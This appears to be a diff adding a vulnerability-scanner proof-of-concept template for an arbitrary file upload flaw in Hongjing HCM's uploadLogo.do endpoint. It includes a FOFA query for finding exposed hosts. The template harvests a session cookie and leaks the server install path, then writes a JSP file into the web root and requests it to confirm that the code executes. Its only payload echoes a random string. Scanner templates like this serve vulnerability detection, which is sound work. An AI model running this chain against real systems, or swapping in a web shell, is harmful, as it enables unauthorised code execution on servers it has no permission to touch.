@@ -1,0 +1,100 @@
+id: poc-yaml-hjsoft-hcm-uploadlogo-anyfile-upload
+info:
+  name: 宏景 HCM uploadLogo 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 宏景 HCM
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: GET
+  path: /module/system/qrcard/mobilewrite/qrcardmain.jsp
+  expression: status_code == 200 && contains(title,"入职登记")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: POST
+  path: /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+  data: '------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="path"
+
+
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="lfType"
+
+
+    0
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="logofile"; filename=""
+
+    Content-Type: image/gif
+
+
+    <%= "bttest1" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="twoFile"; filename=""
+
+    Content-Type: image/gif
+
+
+    <%= "bttest1" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r--'
+  expression: status_code == 200 && contains(body,"\"pathvalue\"")
+  output:
+  - regex_match(body,`.value="(?P<paths>.*?)webapps`)
+- method: POST
+  path: /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+  data: '------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="path"
+
+
+    {{.paths}}webapps~5cROOT~5c{{.t1}}.jsp
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="lfType"
+
+
+    0
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="logofile"; filename=""
+
+    Content-Type: image/gif
+
+
+    <%= "{{.t2}}" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="twoFile"; filename=""
+
+    Content-Type: image/gif
+
+
+    <%= "{{.t2}}" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r--'
+  expression: status_code == 200 && contains(body,"\"pathvalue\"")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
